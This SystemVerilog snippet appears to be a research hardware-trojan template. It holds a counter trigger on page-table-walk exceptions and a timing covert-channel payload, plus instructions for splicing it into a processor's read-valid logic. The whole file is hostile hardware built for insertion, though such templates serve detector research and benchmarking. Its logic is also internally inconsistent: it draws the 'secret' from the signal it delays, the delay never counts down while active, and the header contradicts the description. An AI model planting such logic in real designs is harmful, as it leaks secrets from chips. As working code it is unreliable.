/**
 * Sequential Covert Channel Trojan - Code Snippet
 * 
 * Trust-Hub Status: Related to Leak Information (power only, not timing)
 * Literature Sources: Kocher 1996, Lipp et al. 2021, Lin et al. 2009
 * 
 * Description:
 *   Creates timing-based covert channel
 *   
 * Trigger: Counter on ptw_access_exception_o
 * Payload: Modulate timing of data_rvalid_q based on secret data
 * 
 * Author: Sharjeel Imtiaz (TalTech)
 * Date: January 2026
 */

// ============================================================
// TROJAN TRIGGER LOGIC (Counter-based)
// ============================================================

localparam int TRIGGER_THRESHOLD = 1000;
logic [31:0] trojan_counter;
logic trojan_active;

always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        trojan_counter <= '0;
        trojan_active  <= 1'b0;
    end else begin
        if (ptw_access_exception_o) begin
            trojan_counter <= trojan_counter + 1;
        end
        
        if (trojan_counter >= TRIGGER_THRESHOLD) begin
            trojan_active <= 1'b1;
        end
    end
end

// ============================================================
// PAYLOAD: Timing Covert Channel
// ============================================================

// Timing modulation based on secret bit
logic [7:0] timing_delay;
logic secret_bit;

// Extract secret bit from payload signal (LSB)
assign secret_bit = data_rvalid_q[0];

always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        timing_delay <= '0;
    end else if (trojan_active) begin
        // Long delay for bit '1', short for bit '0'
        timing_delay <= secret_bit ? 8'd255 : 8'd1;
    end else if (timing_delay > 0) begin
        timing_delay <= timing_delay - 1;
    end
end

// ============================================================
// PAYLOAD MODIFICATION INSTRUCTIONS
// ============================================================
// Covert Channel: Modulate timing of data_rvalid_q
//
// Integration Script Must Modify:
//
// IF data_rvalid_q is timing-sensitive:
//   Find: assign data_rvalid_q = ready_signal;
//   Replace: assign data_rvalid_q = (timing_delay == 0) ? ready_signal : 1'b0;
//
// This creates observable timing variations:
//   - Bit '1': 255 cycle delay
//   - Bit '0': 1 cycle delay
//   - Timing difference reveals secret data bit-by-bit